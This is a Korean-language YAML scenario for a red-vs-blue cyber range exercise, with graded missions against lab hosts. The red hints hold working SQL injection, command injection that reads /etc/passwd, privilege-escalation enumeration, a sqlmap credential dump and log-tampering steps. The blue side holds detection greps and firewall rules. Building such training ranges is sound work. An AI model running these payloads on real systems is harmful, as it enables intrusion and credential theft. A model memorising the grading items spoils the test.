id: "championship"
title: "종합 대전: 전체 킬체인"
description: "최종 챔피언십 대전이다. Red Team은 정찰부터 데이터 탈취까지 사이버 킬체인의 전체 단계를 수행해야 한다. Blue Team은 각 단계를 실시간으로 탐지하고 차단하며, 최종적으로 인시던트 보고서를 작성할 수 있는 수준의 포렌식 증거를 확보해야 한다. 양 팀 모두 시간 내에 최대한 많은 미션을 완수하라."
difficulty: "hard"
time_limit: 3600
battle_type: "1v1"

red_missions:
  - order: 1
    instruction: "[정찰] 전체 인프라(10.20.30.0/24)의 호스트와 서비스를 스캔하라."
    hint: "nmap -sV -p 22,80,443,3000,8080,1514,1515,9200 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "open"
      semantic:
        intent: "Cyber Kill Chain Phase 1 (Reconnaissance) — 전체 subnet 의 host + service version 식별. championship 의 시작점."
        success_criteria:
          - "nmap -sV + 표적 port (22/80/443/3000/8080/1514/1515/9200)"
          - "응답에 open port + service version 1개 이상"
          - "최소 2 host 식별 (web/secu/siem 중)"
        acceptable_methods:
          - "nmap -sV -p <ports> CIDR"
          - "masscan + nmap -sV (속도 + 정확도)"
          - "rustscan -a CIDR -- -sV"
        negative_signs:
          - "단일 IP 만 + subnet sweep 없음"
          - "-sV 누락 (version 없음)"
          - "전체 -p- 사용 (시간 초과)"

  - order: 2
    instruction: "[정찰] 웹 서버의 기술 스택과 취약점을 상세 조사하라."
    hint: "whatweb http://10.20.30.80 http://10.20.30.80:3000 http://10.20.30.80:8080 && nikto -h http://10.20.30.80:8080 -maxtime 60s 2>&1 | tail -20"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "Server:"
      semantic:
        intent: "Recon 심화 — 3 web service (Apache/JuiceShop/DVWA) 각각의 stack + 취약점. nikto 의 OSVDB finding + whatweb fingerprint."
        success_criteria:
          - "whatweb 3 URL (port 80 + 3000 + 8080)"
          - "nikto -h URL -maxtime 60s"
          - "응답에 Server + 1개 이상 finding"
        acceptable_methods:
          - "whatweb + nikto"
          - "wapiti / arachni"
          - "ZAP automated scan"
          - "wappalyzer-cli"
        negative_signs:
          - "단일 service 만 + 다른 port 누락"
          - "-maxtime 누락 (너무 오래 걸림)"

  - order: 3
    instruction: "[침투] JuiceShop SQLi로 관리자 인증을 우회하고 토큰을 획득하라."
    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "token"
      semantic:
        intent: "Phase 2 (Initial Access) — SQLi 인증 우회로 admin token. 후속 모든 API 호출 의 prerequisite. OWASP A03+A07."
        success_criteria:
          - "POST /rest/user/login + JSON + SQLi payload (email field)"
          - "응답에 authentication.token (JWT)"
          - "(보너스) bid + role:admin 확인"
        acceptable_methods:
          - "curl -X POST"
          - "Burp Repeater"
          - "sqlmap --form"
        negative_signs:
          - "SQLi payload escape (인용부호 잘못)"
          - "응답 401 받고 alternate 안 시도"

  - order: 4
    instruction: "[침투] DVWA Command Injection으로 시스템 접근 권한을 확보하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;id;whoami;cat+/etc/passwd|head+-5&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "root"
      semantic:
        intent: "Phase 3 (Execution) — Cmd inject 으로 OS command 실행. id + whoami + /etc/passwd 동시 (정찰 효율 극대)."
        success_criteria:
          - "POST /vulnerabilities/exec/ + ;id;whoami;cat /etc/passwd"
          - "응답에 uid + 사용자명 + root 라인"
          - "최소 3 정보 (id/whoami/passwd) 1번에 수집"
        acceptable_methods:
          - "curl POST + chained cmd inject"
          - "다른 inject vector (`|, &&)"
          - "Burp Repeater"
        negative_signs:
          - "단일 cmd 만 + 다른 정보 누락"
          - "쿠키 누락 → redirect"

  - order: 5
    instruction: "[권한상승] SUID 파일과 sudo 설정을 탐색하여 권한 상승 경로를 식별하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;find+/usr+-perm+-4000+-type+f+2>/dev/null|head+-10;sudo+-l+2>&1|head+-5&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "/usr"
      semantic:
        intent: "Phase 5 (Privilege Escalation) — SUID 바이너리 + sudo NOPASSWD 동시 enum. GTFOBins 매칭 후보 식별."
        success_criteria:
          - "find /usr -perm -4000 + sudo -l 동시"
          - "응답에 SUID path + sudo 권한"
          - "(보너스) GTFOBins 매칭 가능 binary 식별"
        acceptable_methods:
          - "find + sudo -l 결합"
          - "linpeas.sh 자동화"
          - "LinEnum.sh"
        negative_signs:
          - "SUID 만 + sudo 누락"
          - "GTFOBins 매핑 없음"

  - order: 6
    instruction: "[측면이동] 내부 호스트(SIEM, 보안장비)로의 접근 가능성을 확인하라."
    hint: "nmap -sV -p 22,443,1514,9200 10.20.30.1 10.20.30.100 --max-retries 1 --host-timeout 15s -T4"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "10.20.30"
      semantic:
        intent: "Phase 4 (Lateral Movement) — secu (10.20.30.1) + siem (10.20.30.100) port scan. 측면 이동 entry 식별."
        success_criteria:
          - "nmap -sV -p <ports> 다중 host"
          - "응답에 IP + port 별 status"
          - "minimal attack surface 확인 (firewall best practice)"
        acceptable_methods:
          - "nmap -sV -p <list> <hosts>"
          - "masscan"
          - "TCP banner 수동"
        negative_signs:
          - "단일 host 만"
          - "scan timeout 만 + 차단됨 결론"

  - order: 7
    instruction: "[데이터탈취] 데이터베이스를 덤프하고 사용자 크리덴셜을 추출하라."
    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch -T users --dump 2>&1 | tail -20"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "admin"
      semantic:
        intent: "Phase 7 (Actions on Objectives — Exfil) — SQLi DB dump 로 모든 user + password hash. credential stuffing + hash crack 의 base."
        success_criteria:
          - "sqlmap --batch --dump -T users"
          - "응답에 admin row + password hash (32자 hex)"
          - "(보너스) hash 종류 식별"
        acceptable_methods:
          - "sqlmap --dump"
          - "manual UNION SELECT"
          - "Burp Intruder"
        negative_signs:
          - "table list 만 + dump 안 함"
          - "interactive 응답 대기 (--batch 누락)"

  - order: 8
    instruction: "[은폐] 로그 변조와 흔적 삭제를 시도하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+attack_complete+>+/tmp/red_flag;echo+killchain_complete&Submit=Submit'"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "killchain_complete"
      semantic:
        intent: "Phase 7 마지막 — anti-forensics. 흔적 삭제 + championship 완수 flag (/tmp/red_flag)."
        success_criteria:
          - "/tmp/red_flag 또는 동등 파일 생성"
          - "killchain_complete confirm"
          - "(보너스) /var/log 변조 시도 (권한 부족 시 fail OK)"
        acceptable_methods:
          - "echo > /tmp/<flag>"
          - "log rotation 강제"
          - "history 정리"
        negative_signs:
          - "killchain_complete 없음"
          - "anti-forensic 의도 없이 단순 file 생성"

blue_missions:
  - order: 1
    instruction: "[탐지-정찰] suricata에서 네트워크 스캔 활동을 탐지하라."
    hint: "tail -30 /var/log/suricata/fast.log | grep '10.20.30.201'"
    points: 10
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "10.20.30.201"
      semantic:
        intent: "Red #1-2 의 nmap/whatweb/nikto 정찰 → Suricata ET scan SID 매칭. 1차 탐지 신호."
        success_criteria:
          - "fast.log 의 attacker IP (10.20.30.201) 매칭"
          - "scan/recon classification"
          - "최소 1 alert + sid"
        acceptable_methods:
          - "grep + tail fast.log"
          - "jq alert filtering eve.json"
          - "Wazuh suricata decoder"
        negative_signs:
          - "fast.log 비어있음 → suricata 미실행"
          - "alert 보이지만 IP 분석 없음"

  - order: 2
    instruction: "[탐지-침투] Apache 로그와 ModSecurity에서 SQLi/Command Injection을 탐지하라."
    hint: "grep -iE 'sql|union|exec|cmd|vulnerabilities' /var/log/apache2/access.log | tail -20"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "vulnerabilities"
      semantic:
        intent: "Red #3-5 의 SQLi + cmd inject 탐지 — access.log + ModSecurity audit 결합. URL parameter 페이로드 식별."
        success_criteria:
          - "access.log grep sql/union/exec/cmd/vulnerabilities"
          - "/vulnerabilities/(sqli|exec) 호출 + 페이로드"
          - "최근 20 line + IP + 시간 추출"
        acceptable_methods:
          - "grep + tail access.log"
          - "ModSecurity audit log + jq"
          - "GoAccess 시각화"
          - "ELK Discover query"
        negative_signs:
          - "키워드 매칭 없이 raw dump"
          - "modsec_audit.log 무시"

  - order: 3
    instruction: "[차단] nftables로 공격자 IP를 즉시 차단하고 로깅하라."
    hint: "nft add rule inet filter input ip saddr 10.20.30.201 log prefix '\"CHAMP-BLOCK: \"' drop"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Containment — attacker IP 전체 차단 + log prefix 로 추적. championship 의 핵심 응답."
        success_criteria:
          - "nft add rule inet filter input ip saddr <ip> drop"
          - "log prefix CHAMP-BLOCK: 추가"
          - "rule 적용 후 nft list 로 확인"
        acceptable_methods:
          - "nft add rule + log prefix + drop"
          - "iptables -I INPUT -j LOG ; -j DROP"
          - "fail2ban (자동)"
          - "configure_nftables skill"
        negative_signs:
          - "log prefix 누락 → 추적 어려움"
          - "input chain 만 + forward/output 누락"

  - order: 4
    instruction: "[차단] 웹 서버에서 악성 파일을 탐지하고 제거하라."
    hint: "find /var/www /tmp -name '*.php' -newer /var/log/apache2/error.log -ls 2>/dev/null; grep -rl 'system\\|shell_exec' /var/www/ 2>/dev/null"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Webshell + 의심 파일 식별 + 즉시 제거. find -newer + grep 위험함수 결합."
        success_criteria:
          - "find /var/www /tmp -name '*.php' -newer + 위험 함수 grep"
          - "발견 file 1개 이상 식별"
          - "(보너스) 제거 액션 (rm -v 또는 quarantine)"
        acceptable_methods:
          - "find + grep"
          - "yara rule (signature 기반)"
          - "rkhunter --check"
          - "Wazuh syscheck"
        negative_signs:
          - "find 만 + 내용 검사 없음"
          - "정상 PHP 와 webshell 구분 못함"

  - order: 5
    instruction: "[분석] Wazuh에서 전체 공격 관련 알림을 수집하라."
    hint: "cat /var/ossec/logs/alerts/alerts.json | tail -50 | grep -iE 'alert|rule'"
    points: 10
    target_vm: siem
    verify:
      type: "output_contains"
      expect: "rule"
      semantic:
        intent: "Wazuh 통합 alert — multi-agent (web + siem + secu) 의 rule 매칭 모음. SIEM 차원 종합."
        success_criteria:
          - "alerts.json grep + tail"
          - "rule.id + rule.description + agent.name 추출"
          - "최근 50 alert + 카테고리 분류"
        acceptable_methods:
          - "grep + tail"
          - "jq filtering"
          - "Wazuh API: GET /security/agents/<id>/alerts"
          - "Kibana 대시보드"
        negative_signs:
          - "raw dump + rule 분석 없음"
          - "단일 agent 만 (cross-agent correlation 누락)"

  - order: 6
    instruction: "[분석] suricata eve.json에서 공격자의 전체 활동 타임라인을 재구성하라."
    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp','')[:19], json.loads(l).get('event_type','')) for l in sys.stdin]\" 2>/dev/null | sort | tail -30"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Network IDS timeline — attacker 의 모든 event (alert/http/dns/flow) 시간순 정렬. forensic 보고서 핵심."
        success_criteria:
          - "eve.json grep + python json parse + sort by timestamp"
          - "event_type + timestamp 추출"
          - "최소 5 event 시간순"
        acceptable_methods:
          - "grep + python json"
          - "jq + sort_by(.timestamp)"
          - "ELK timeline UI"
          - "TheHive case management"
        negative_signs:
          - "정렬 없이 raw dump"
          - "event_type 분류 없음"

  - order: 7
    instruction: "[복구] Apache를 재시작하고 서비스 정상 동작을 확인하라."
    hint: "systemctl restart apache2 && curl -s -o /dev/null -w '%{http_code}' http://localhost && echo ' - Service restored'"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "Service restored"
      semantic:
        intent: "Phase 4 (Recovery) — webshell 제거 후 Apache restart + 정상 동작 확인. graceful 권장."
        success_criteria:
          - "systemctl restart 또는 reload apache2"
          - "curl localhost + http_code 확인"
          - "Service restored confirm"
        acceptable_methods:
          - "systemctl restart + curl"
          - "apachectl graceful"
          - "service apache2 restart (legacy)"
        negative_signs:
          - "restart 만 + 동작 검증 누락"
          - "configtest 안 함 (syntax error 시 down)"

  - order: 8
    instruction: "[보고] nftables 최종 룰셋을 확인하여 방어 상태를 검증하라."
    hint: "nft list ruleset | head -40"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "table"
      semantic:
        intent: "Final defense state — 적용된 방어 정책 (block + rate limit + allowlist) 종합 확인. 보고서 산출물."
        success_criteria:
          - "nft list ruleset"
          - "table + chain + 1개 이상 rule"
          - "(보너스) packet/byte counter 분석"
        acceptable_methods:
          - "nft list ruleset"
          - "nft list table inet filter"
          - "iptables-save (legacy)"
        negative_signs:
          - "list 만 + 분석 없음"
          - "table 비어있음 (방어 미적용)"
